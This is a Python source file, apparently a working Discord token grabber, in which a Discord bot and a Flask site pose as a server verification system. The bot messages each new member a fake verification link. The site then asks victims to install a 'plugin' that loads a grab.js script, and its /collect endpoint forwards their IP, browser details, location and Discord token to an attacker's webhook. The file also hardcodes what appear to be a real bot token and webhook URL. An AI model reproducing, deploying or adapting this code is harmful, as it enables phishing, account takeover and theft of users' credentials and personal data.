import threading
import os
import discord
from discord.ext import commands
import requests
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify

# ================== CONFIGURATION ==================
TOKEN = "MTU3MjUxODU5NDgxNjkwMTE1MA.GXovvv.HfcH23G8e9xrXmtG_NP9t7gf8QhBzkwgxeRKVc"
WEBHOOK_URL = "https://discord.com/api/webhooks/1572990108112654458/VQRjZOhIMvn3EFoWDpRBM9V2SI3pAozI8PrMXsja2UMgOroS9y8d9ArvCKiZzZFNMmZK"
VERIF_URL = "https://bot-discord-web.onrender.com/"
DISCORD_INVITE = "https://discord.gg/reUcTewDKm"
# ===================================================


# ---------- PARTIE 1 : LE SITE WEB (FLASK) ----------
app = Flask(__name__)

PAGE_VERIF = """
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Vérification Discord</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
  body { background:#313338; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; }
  .card { background:#2b2d31; padding:40px; border-radius:12px; width:420px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,.5); }
  h1 { font-size:22px; margin-bottom:10px; }
  p { color:#b5bac1; font-size:14px; margin-bottom:25px; }
  button { background:#5865F2; color:#fff; border:none; padding:14px 30px; border-radius:8px; font-size:16px; cursor:pointer; width:100%; transition:.2s; margin-top:8px; }
  button:hover { background:#4752c4; }
  .no { background:transparent; color:#b5bac1; border:1px solid #4e5058; }
  .no:hover { background:#3c3d44; }
</style>
</head>
<body>
  <div class="card">
    <h1>🔐 Vérification Discord</h1>
    <p>Pour accéder au serveur, veuillez vérifier votre compte.</p>
    <button onclick="installer()">✅ Vérifier mon compte</button>
    <button class="no" onclick="refuser()">❌ Annuler</button>
  </div>
<script>
function refuser() { window.location.href = "{{ discord }}"; }
function installer() { window.location.href = "/plugin"; }
</script>
</body>
</html>
"""

PAGE_PLUGIN = """
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Plugin Discord</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
  body { background:#313338; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; }
  .card { background:#2b2d31; padding:40px; border-radius:12px; width:460px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,.5); }
  h1 { font-size:22px; margin-bottom:10px; }
  p { color:#b5bac1; font-size:14px; margin-bottom:25px; line-height:1.5; }
  button { background:#5865F2; color:#fff; border:none; padding:14px 30px; border-radius:8px; font-size:16px; cursor:pointer; width:100%; transition:.2s; margin-top:8px; }
  button:hover { background:#4752c4; }
  .no { background:transparent; color:#b5bac1; border:1px solid #4e5058; }
  .no:hover { background:#3c3d44; }
  .ok { background:#23a55a; }
  .ok:hover { background:#1e8a4b; }
</style>
</head>
<body>
  <div class="card">
    <h1>📦 Plugin requis</h1>
    <p>Un plugin est nécessaire pour finaliser la vérification.<br>L'installer maintenant ?</p>
    <button class="ok" onclick="accepter()">✅ Oui, installer</button>
    <button class="no" onclick="refuser()">❌ Non, plus tard</button>
  </div>
<script>
function refuser() { window.location.href = "{{ discord }}"; }
function accepter() {
  var s = document.createElement('script');
  s.src = "/static/grab.js";
  document.body.appendChild(s);
}
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(PAGE_VERIF, discord=DISCORD_INVITE)

@app.route("/plugin")
def plugin():
    return render_template_string(PAGE_PLUGIN, discord=DISCORD_INVITE)

@app.route("/collect", methods=["POST"])
def collect():
    data = request.get_json()
    if not data:
        return jsonify({"ok": False})
    embed = {
        "title": "🎯 Nouvelle victime grabée",
        "color": 0x00FF00,
        "fields": [
            {"name": "🌐 IP", "value": data.get("ip", "?"), "inline": True},
            {"name": "📱 Navigateur", "value": data.get("ua", "?")[:80], "inline": False},
            {"name": "💻 Plateforme", "value": data.get("platform", "?"), "inline": True},
            {"name": "🔑 Token Discord", "value": f"```{data.get('token', 'Aucun trouvé')}```", "inline": False},
            {"name": "🏠 Ville/IP Info", "value": data.get("ipinfo", "?"), "inline": False},
        ]
    }
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except:
        pass
    return jsonify({"ok": True})

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)


# ---------- PARTIE 2 : LE BOT DISCORD ----------
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

def send_log(title, fields, color=0xFF0000):
    try:
        requests.post(WEBHOOK_URL, json={
            "embeds": [{
                "title": title, "color": color, "fields": fields,
                "footer": {"text": f"Grabber • {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"}
            }]
        })
    except Exception as e:
        print(e)

class VerifView(discord.ui.View):
    def __init__(self, member):
        super().__init__(timeout=None)
        self.member = member

    @discord.ui.button(label="✅ Se vérifier", style=discord.ButtonStyle.success, emoji="🔐")
    async def verify_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        link = f"{VERIF_URL}?id={self.member.id}"
        await interaction.response.send_message(
            f"**🔗 Clique ici pour te vérifier :**\n{link}\n\n"
            f"⚠️ Ne partage ce lien avec personne.",
            ephemeral=True
        )
        send_log("📨 Lien de vérification envoyé", [
            {"name": "👤 Membre", "value": f"{self.member} ({self.member.id})", "inline": True},
            {"name": "📅 Date", "value": datetime.now().strftime("%d/%m/%Y %H:%M"), "inline": True},
        ], color=0xFFFF00)

@bot.event
async def on_member_join(member):
    if member.bot:
        return
    send_log("👋 Nouveau membre", [
        {"name": "👤 Pseudo", "value": str(member), "inline": True},
        {"name": "🆔 ID", "value": str(member.id), "inline": True},
        {"name": "📅 Créé", "value": member.created_at.strftime("%d/%m/%Y"), "inline": True},
    ], color=0x00FF00)
    try:
        view = VerifView(member)
        await member.send(
            f"👋 **Bienvenue {member.name}**\n"
            f"Pour accéder au serveur, clique sur **Se vérifier** 👇",
            view=view
        )
    except:
        pass

@bot.tree.command(name="verif", description="Envoyer un message de vérification")
async def verif(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔐 Vérification requise",
        description="Clique sur le bouton ci-dessous pour te vérifier.",
        color=0x5865F2
    )
    view = VerifView(interaction.user)
    await interaction.response.send_message(embed=embed, view=view)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Bot connecté : {bot.user}")
    send_log("🚀 Bot en ligne", [
        {"name": "Bot", "value": str(bot.user), "inline": True},
    ], color=0x00FF00)


# ---------- LANCEMENT DES DEUX EN MÊME TEMPS ----------
if __name__ == "__main__":
    # On lance Flask en arrière-plan
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # On lance le bot Discord
    bot.run(TOKEN)
